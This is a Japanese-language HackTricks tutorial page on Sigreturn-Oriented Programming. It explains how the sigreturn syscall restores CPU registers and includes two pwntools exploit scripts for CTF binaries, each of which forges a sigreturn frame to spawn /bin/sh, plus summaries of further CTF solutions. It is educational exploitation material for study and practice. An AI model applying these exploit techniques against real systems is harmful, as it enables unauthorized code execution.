# SROP - Sigreturn-Oriented Programming

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**または[telegramグループ](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)を**フォロー**する。
- **ハッキングトリックを共有するために** [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する。

</details>

## 基本情報

**`Sigreturn`** は、主にシグナルハンドラが実行を完了した後にクリーンアップするために使用される特別な **シスコール** です。シグナルは、オペレーティングシステムによってプログラムに送信される割り込みであり、通常は何らかの例外的な状況が発生したことを示すために送信されます。プログラムがシグナルを受信すると、現在の作業を一時停止して **シグナルハンドラ** と呼ばれる、シグナルを処理するために設計された特別な関数でシグナルを処理します。

シグナルハンドラが完了した後、プログラムは何も起こらなかったかのように **以前の状態に戻る必要があります。** ここで **`sigreturn`** が重要な役割を果たします。これにより、プログラムは **シグナルハンドラから戻り**、シグナルハンドラによって使用されたスタックフレーム（関数呼び出しとローカル変数を格納するメモリセクション）をクリーンアップしてプログラムの状態を復元できます。

興味深いのは、**`sigreturn`** がプログラムの状態を復元する方法です。これは、**CPUのすべてのレジスタ値をスタックに保存することで行います。** シグナルがブロックされなくなると、**`sigreturn` はこれらの値をスタックからポップ**して、効果的にCPUのレジスタをシグナルが処理される前の状態にリセットします。これには、スタックポインタレジスタ（RSP）も含まれます。これは現在のスタックのトップを指すレジスタです。

{% hint style="danger" %}
ROPチェーンから **`sigreturn`** を呼び出し、**スタックにロードしたいレジストリ値を追加**することで、すべてのレジスタ値を **制御** し、したがって例えば `/bin/sh` を指定して `execve` シスコールを呼び出すことが可能です。
{% endhint %}

これは、他の Ret2syscall を呼び出すためのパラメータを簡単に制御できる **Ret2syscall の一種** であることに注意してください：

{% content-ref url="rop-syscall-execv/" %}
[rop-syscall-execv](rop-syscall-execv/)
{% endcontent-ref %}

興味がある場合は、後で値を回復するためにスタックに保存される **sigcontext 構造** がどのように見えるかを確認できます（[**こちら**](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html)の図）。
```
+--------------------+--------------------+
| rt_sigeturn()      | uc_flags           |
+--------------------+--------------------+
| &uc                | uc_stack.ss_sp     |
+--------------------+--------------------+
| uc_stack.ss_flags  | uc.stack.ss_size   |
+--------------------+--------------------+
| r8                 | r9                 |
+--------------------+--------------------+
| r10                | r11                |
+--------------------+--------------------+
| r12                | r13                |
+--------------------+--------------------+
| r14                | r15                |
+--------------------+--------------------+
| rdi                | rsi                |
+--------------------+--------------------+
| rbp                | rbx                |
+--------------------+--------------------+
| rdx                | rax                |
+--------------------+--------------------+
| rcx                | rsp                |
+--------------------+--------------------+
| rip                | eflags             |
+--------------------+--------------------+
| cs / gs / fs       | err                |
+--------------------+--------------------+
| trapno             | oldmask (unused)   |
+--------------------+--------------------+
| cr2 (segfault addr)| &fpstate           |
+--------------------+--------------------+
| __reserved         | sigmask            |
+--------------------+--------------------+
```
より詳しい説明はこちらをチェックしてください:

{% embed url="https://youtu.be/ADULSwnQs-s?feature=shared" %}

## 例

[**こちらの例**](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop)で、signeturnへの呼び出しがROPを介して構築されています（rxaに値`0xf`を入れる）。ただし、これはそこからの最終的なエクスプロイトです:
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = process()

BINSH = elf.address + 0x1250
POP_RAX = 0x41018
SYSCALL_RET = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = SYSCALL_RET

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)         # 0xf is the number of the syscall sigreturn
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```
以下の[**こちらのエクスプロイト**](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html)もチェックしてください。バイナリが既に`sigreturn`を呼び出しているため、**ROP**を構築する必要はありません。
```python
from pwn import *

# Establish the target
target = process("./small_boi")
#gdb.attach(target, gdbscript = 'b *0x40017c')
#target = remote("pwn.chal.csaw.io", 1002)

# Establish the target architecture
context.arch = "amd64"

# Establish the address of the sigreturn function
sigreturn = p64(0x40017c)

# Start making our sigreturn frame
frame = SigreturnFrame()

frame.rip = 0x400185 # Syscall instruction
frame.rax = 59       # execve syscall
frame.rdi = 0x4001ca # Address of "/bin/sh"
frame.rsi = 0x0      # NULL
frame.rdx = 0x0      # NULL

payload = "0"*0x28 # Offset to return address
payload += sigreturn # Function with sigreturn
payload += str(frame)[8:] # Our sigreturn frame, adjusted for the 8 byte return shift of the stack

target.sendline(payload) # Send the target payload

# Drop to an interactive shell
target.interactive()
```
## その他の例と参考文献

* [https://youtu.be/ADULSwnQs-s?feature=shared](https://youtu.be/ADULSwnQs-s?feature=shared)
* [https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop)
* [https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html)
* **スタックに書き込み**を許可するアセンブリバイナリで、**`sigreturn`** シスコールを呼び出します。 **sigreturn** 構造を介してスタックに [**ret2syscall**](rop-syscall-execv/) を書き込み、バイナリのメモリ内にあるフラグを読み取ることが可能です。
* [https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html)
* **スタックに書き込み**を許可するアセンブリバイナリで、**`sigreturn`** シスコールを呼び出します。 **sigreturn** 構造を介してスタックに [**ret2syscall**](rop-syscall-execv/) を書き込むことが可能です（バイナリには文字列 `/bin/sh` が含まれています）。
* [https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html](https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html)
* 64ビット、relro なし、canary なし、nx、pie なし。 `gets` 関数を悪用したシンプルなバッファオーバーフローで、[**ret2syscall**](rop-syscall-execv/) を実行します。ROPチェーンは、再度getsを呼び出して`.bss`に `/bin/sh` を書き込み、`alarm` 関数を悪用してeaxを `0xf` に設定して **SROP** を呼び出し、シェルを実行します。
* [https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html](https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html)
* 64ビットアセンブリプログラム、relro なし、canary なし、nx、pie なし。 フローはスタックに書き込み、複数のレジスタを制御し、シスコールを呼び出してから `exit` を呼び出すことを可能にします。 選択されたシスコールは `sigreturn` で、レジスタを設定し、`eip` を以前のシスコール命令を呼び出して `memprotect` を実行してバイナリスペースを `rwx` に設定し、ESP をバイナリスペースに設定します。 プログラムは再度ESPを読み取るためにreadを呼び出しますが、この場合ESPは次の命令を指すようになるため、シェルコードを渡すと次の命令として書き込まれ、実行されます。
